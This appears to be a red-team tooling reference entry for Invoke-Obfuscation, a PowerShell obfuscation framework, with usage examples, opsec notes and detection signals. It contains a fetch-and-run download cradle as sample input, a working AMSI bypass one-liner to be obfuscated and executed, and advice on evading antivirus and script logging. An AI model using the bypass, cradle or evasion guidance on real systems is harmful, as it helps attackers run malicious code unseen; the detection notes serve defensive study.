---
name: Invoke-Obfuscation
category: defense-evasion
subcategories: [powershell-obfuscation, amsi-evasion, string-obfuscation]
tradecraft_tags: [powershell, obfuscation, amsi-bypass, string-replacement, encode, defense-evasion]
mitre_attack:
  - id: T1027.010
    name: Obfuscated Files or Information — Command Obfuscation
source:
  url: https://github.com/danielbohannon/Invoke-Obfuscation
  license: Apache-2.0
  maintained: false
binary_type: powershell-script
binary_filename: Invoke-Obfuscation.ps1
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  Obfuscated PowerShell commands are detectable by: (1) Script block logging captures
  the decoded/executed content after obfuscation is applied, (2) AMSI may still detect
  obfuscated bypass strings depending on implementation, (3) unusual PowerShell command
  syntax (large encoded strings, heavy string manipulation) is flagged by behavioral analytics.
usage_examples:
  - description: Obfuscate a PowerShell command string
    args: "Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://...')} -Technique TOKEN"
  - description: String-based obfuscation
    args: "Invoke-Obfuscation -ScriptBlock {<script>} -Technique STRING"
  - description: Encoding obfuscation (Base64 variants)
    args: "Invoke-Obfuscation -ScriptBlock {<script>} -Technique ENCODING"
  - description: Launcher obfuscation (changes how PS is invoked)
    args: "Invoke-Obfuscation -ScriptBlock {<script>} -Technique LAUNCHER"
opsec_notes: |
  Invoke-Obfuscation generates obfuscated PowerShell that evades string-based signatures
  but NOT behavioral analysis. Script block logging (Event 4104) captures the
  DEOBFUSCATED content when the script actually runs — obfuscation is transparent to
  logging at the deobfuscation stage. Modern AMSI has improved detection for
  Invoke-Obfuscation output patterns. Primary use: bypass static string-based detection
  for specific PowerShell cmdlets (PowerView function names, etc.).
gotchas: |
  Invoke-Obfuscation is not actively maintained (~2017-2019). Its output patterns are
  well-known to AV/EDR vendors. Use it as a STARTING POINT for obfuscation, then
  modify the output further. For modern environments, the most effective approach is
  still: (1) use .NET assemblies instead of PowerShell (avoids PS logging entirely),
  (2) AMSI bypass before loading any PowerShell. Invoke-Obfuscation is most effective
  against AV products that rely heavily on string-based signatures.
related_ttps: [amsi-bypass, invoke-noisycall, powerview, domainpasswordspray]
alternatives: [chameleon-ps-obfuscation, manual-string-splitting]
common_args:
  -ScriptBlock:
    description: PowerShell script content to obfuscate
    typical_values: ["{IEX(New-Object Net.WebClient).DownloadString('http://...')}"]
    required: true
  -Technique:
    description: Obfuscation technique
    typical_values: [TOKEN, STRING, ENCODING, LAUNCHER, "TOKEN\\ALL"]
last_updated: 2026-05-29
---

# Invoke-Obfuscation

Daniel Bohannon's PowerShell obfuscation framework. Generates heavily obfuscated
PowerShell that evades string-based signature detection. Multiple obfuscation
techniques: token replacement, string manipulation, encoding, and launcher modification.

## Obfuscation Technique Summary

| Technique | What it does | Detection evasion |
|-----------|-------------|------------------|
| `TOKEN` | Manipulate PowerShell tokens (backticks, quotes, concatenation) | String-based |
| `STRING` | String concatenation and character code replacement | String-based |
| `ENCODING` | Base64/special encoding of script content | String-based |
| `LAUNCHER` | Change how PowerShell is invoked (mshta, wscript, etc.) | Process-based |
| `COMPRESS` | Compress + encode script | String-based |

## Limitations

All obfuscation is reversed before execution — script block logging captures the
actual executed content regardless of obfuscation. For true detection evasion:
1. Use .NET assemblies (no PowerShell logging) — Apollo inline_assembly
2. AMSI bypass first, then run plaintext PowerShell
3. Obfuscation as a last resort for environments relying on static signatures

## Practical Usage Pattern

```powershell
# Load Invoke-Obfuscation (requires AMSI bypass first):
Import-Module Invoke-Obfuscation.ps1

# Obfuscate a AMSI bypass:
Invoke-Obfuscation -ScriptBlock {
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} -Technique TOKEN -Quiet

# Take the output and execute it to patch AMSI before loading other tools
```
